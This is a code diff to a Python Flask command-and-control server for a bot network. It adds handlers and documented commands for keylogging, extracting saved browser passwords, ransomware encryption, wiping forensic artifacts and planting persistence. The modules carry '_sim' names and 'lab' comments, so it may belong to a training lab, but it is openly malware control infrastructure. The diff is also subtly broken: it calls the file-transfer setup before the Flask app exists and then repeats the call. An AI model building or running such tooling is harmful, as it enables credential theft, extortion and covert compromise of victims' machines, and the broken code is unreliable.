@@ -29,6 +29,13 @@ import base64
 import hashlib
 import threading
 import time
+import keylogger_sim
+import cred_extractor_sim
+import ransomware_sim
+import anti_forensics_sim
+import system_profiler
+import persistence_sim
+import file_transfer
 from file_transfer import add_file_transfer_endpoints
 add_file_transfer_endpoints(app, auth_token=AUTH_TOKEN)
 from datetime import datetime
@@ -121,6 +128,10 @@ def decrypt_task(payload: dict) -> dict | None:
 # ── Encrypted C2 server ───────────────────────────────────────
 
 app = Flask(__name__)
+
+# After: app = Flask(__name__)
+from file_transfer import add_file_transfer_endpoints
+add_file_transfer_endpoints(app, auth_token=AUTH_TOKEN)
 
 REGISTERED_BOTS = {}
 TASK_QUEUES     = {}
@@ -239,7 +250,22 @@ def push_task():
     #   "download_file"   — bot downloads file from C2
     #   "lateral_ssh"     — SSH jump chain lateral movement
     #   "lateral_nfs"     — NFS share taint
-    
+    # start_keylogger             Start evdev keyboard capture
+    # stop_keylogger              Stop keylogger
+    # get_keylogs                 Retrieve captured keystrokes from bot
+    # clear_keylogs               Clear keylog buffer
+    # extract_creds               Extract browser saved passwords
+    # system_profile              Full system enumeration (OS/HW/net/users)
+    # ransom_setup                Create ransomware test directory
+    # ransom_encrypt              Encrypt test files (AES-256-CBC)
+    # ransom_decrypt              Decrypt test files (key recovery)
+    # ransom_status               Show encryption state
+    # ransom_cleanup              Delete test directory
+    # anti_forensics              Clear all lab-generated artifacts
+    # anti_forensics_status       List clearable lab artifacts
+    # plant_persist [method]      Install persistence (cron|bashrc|systemd|...)
+    # remove_persist [method]     Remove persistence
+
     data   = request.get_json()
     bot_id = data.get("bot_id", "all")
 
@@ -252,6 +278,21 @@ def push_task():
         "issued_at":   datetime.now().isoformat(),
     }
 
+    TASK_HANDLERS = {
+        "start_keylogger":       keylogger_sim.handle_c2_task,
+        "stop_keylogger":        keylogger_sim.handle_c2_task,
+        "get_keylogs":           keylogger_sim.handle_c2_task,
+        "clear_keylogs":         keylogger_sim.handle_c2_task,
+        "ransom_setup":          ransomware_sim.handle_c2_task,
+        "ransom_encrypt":        ransomware_sim.handle_c2_task,
+        "ransom_decrypt":        ransomware_sim.handle_c2_task,
+        "ransom_status":         ransomware_sim.handle_c2_task,
+        "ransom_cleanup":        ransomware_sim.handle_c2_task,
+        "anti_forensics":        anti_forensics_sim.handle_c2_task,
+        "anti_forensics_status": anti_forensics_sim.handle_c2_task,
+        "system_profile":        system_profiler.handle_task,
+    }
+    
     # Pass through all type-specific optional fields if present
     for field in ("cpu", "mode", "jitter", "workers"):
         if field in data:
